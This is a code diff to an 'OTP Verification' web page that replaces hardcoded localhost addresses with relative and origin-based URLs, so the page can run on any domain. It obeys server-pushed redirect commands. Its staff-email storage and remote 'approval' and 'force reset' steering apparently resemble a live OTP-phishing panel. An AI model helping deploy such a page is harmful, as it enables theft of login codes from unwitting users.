@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>OTP Verification</title>
 
-    <script src="http://localhost:3000/socket.io/socket.io.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
     <style>
      .bg-beach {
             background-image: url('https://i.pinimg.com/736x/a6/17/2f/a6172f4e83b679433c00bf71595a3dce.jpg');
@@ -41,7 +41,7 @@
 
     <script>
         // Connect directly via absolute path link
-        const socket = io("http://localhost:3000");
+        const socket = io();
         let currentEmail = localStorage.getItem('active_staff_email') || "";
         document.getElementById('email_context').value = currentEmail;
 
@@ -58,11 +58,14 @@
         // Listen for next background commands (allows navigating to approval or reset)
         socket.on("redirect_command", (destinationUrl) => {
             if (destinationUrl === "/force_reset_kick") {
-                localStorage.removeItem('active_staff_email');
-                window.location.href = "http://localhost:3000/";
-            } else {
-                window.location.href = "http://localhost:3000" + destinationUrl; 
-            }
+    localStorage.removeItem('active_staff_email');
+    // ✅ Dynamically redirects to your homepage on any domain
+    window.location.href = window.location.origin + "/";
+} else {
+    // ✅ Dynamically redirects to the target destination on any domain
+    window.location.href = window.location.origin + destinationUrl;
+}
+
         });
 
         function jump(elem, nextId) {
